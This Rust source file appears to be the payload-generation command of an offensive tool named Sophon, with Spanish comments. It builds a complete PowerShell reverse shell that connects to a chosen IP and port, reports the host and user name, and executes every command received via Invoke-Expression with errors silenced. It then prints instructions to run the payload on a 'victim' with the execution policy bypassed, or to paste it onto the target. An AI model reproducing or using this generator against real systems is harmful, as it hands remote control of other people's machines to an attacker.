use colored::Colorize;
use std::fs;
use tracing::{info, error};

/// Tipos de payload soportados
pub enum PayloadType {
    PowerShell,
}

impl PayloadType {
    /// Parsea el string del argumento CLI al enum
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "powershell" | "ps1" | "ps" => Some(PayloadType::PowerShell),
            _ => None,
        }
    }

    /// Devuelve la extensión recomendada para el archivo
    #[allow(dead_code)]
    pub fn extension(&self) -> &str {
        match self {
            PayloadType::PowerShell => ".ps1",
        }
    }

    /// Devuelve el nombre legible del tipo de payload
    pub fn display_name(&self) -> &str {
        match self {
            PayloadType::PowerShell => "PowerShell",
        }
    }
}

/// Genera el contenido del payload según el tipo
fn build_payload(payload_type: &PayloadType, ip: &str, port: u16) -> String {
    match payload_type {
        PayloadType::PowerShell => build_powershell(ip, port),
    }
}

/// Genera un reverse shell en PowerShell que conecta la consola al listener
fn build_powershell(ip: &str, port: u16) -> String {
    format!(
        r#"# Sophon Reverse Shell Payload (PowerShell)
# Target: {ip}:{port}
# Generado por Sophon - Herramienta de reconocimiento de red

$ErrorActionPreference = "SilentlyContinue"

try {{
    $client = New-Object System.Net.Sockets.TcpClient("{ip}", {port})
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | % {{0}}

    # Enviar info del sistema al conectar
    $sysinfo = "PS $($env:COMPUTERNAME)\$($env:USERNAME) @ $(Get-Location)`n"
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sysinfo)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $result = (Invoke-Expression $data 2>&1 | Out-String)
        $prompt = $result + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([Text.Encoding]::ASCII).GetBytes($prompt)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }}
}} catch {{
    # Conexion fallida o cerrada
}} finally {{
    if ($client) {{ $client.Close() }}
}}
"#,
        ip = ip,
        port = port
    )
}

/// Punto de entrada del comando generate
pub async fn execute(ip: &str, port: u16, type_str: &str, output: Option<&str>) {
    // Validar el tipo de payload
    let payload_type = match PayloadType::from_str(type_str) {
        Some(pt) => pt,
        None => {
            error!("Tipo de payload no soportado: {}", type_str);
            println!(
                "{} Tipo de payload '{}' no reconocido. Tipos disponibles: {}",
                "[-]".red(),
                type_str.yellow(),
                "powershell".bright_cyan()
            );
            return;
        }
    };

    info!(
        "Generando payload {} para {}:{}",
        payload_type.display_name(),
        ip,
        port
    );

    // Generar el contenido del payload
    let payload_content = build_payload(&payload_type, ip, port);

    match output {
        Some(path) => {
            // Guardar a archivo
            match fs::write(path, &payload_content) {
                Ok(_) => {
                    println!(
                        "{} Payload {} generado exitosamente:",
                        "[SOPHON]".blue().bold(),
                        payload_type.display_name().bright_cyan()
                    );
                    println!(
                        "    {} Archivo: {}",
                        "[+]".bright_green(),
                        path.bright_purple()
                    );
                    println!(
                        "    {} Target:  {}:{}",
                        "[+]".bright_green(),
                        ip.cyan(),
                        port.to_string().cyan()
                    );
                    println!(
                        "    {} Tamaño: {} bytes",
                        "[+]".bright_green(),
                        payload_content.len().to_string().yellow()
                    );

                    // Mostrar instrucciones de ejecución
                    println!();
                    println!(
                        "{} Para ejecutar en la víctima (Windows):",
                        "[*]".yellow().bold()
                    );
                    println!(
                        "    powershell -ExecutionPolicy Bypass -File {}",
                        path.bright_white()
                    );

                    info!("Payload guardado en: {}", path);
                }
                Err(e) => {
                    error!("No se pudo escribir el archivo: {}", e);
                    println!(
                        "{} Error al escribir el archivo '{}': {}",
                        "[-]".red(),
                        path,
                        e
                    );
                }
            }
        }
        None => {
            // Imprimir en pantalla
            println!(
                "{} Payload generado ({} → {}:{}):",
                "[SOPHON]".blue().bold(),
                payload_type.display_name().bright_cyan(),
                ip.cyan(),
                port.to_string().cyan()
            );
            println!("{}", "─".repeat(60).bright_black());
            println!("{}", payload_content);
            println!("{}", "─".repeat(60).bright_black());
            println!(
                "{} Copia y pega el payload en la máquina objetivo.",
                "[*]".yellow().bold()
            );
        }
    }
}
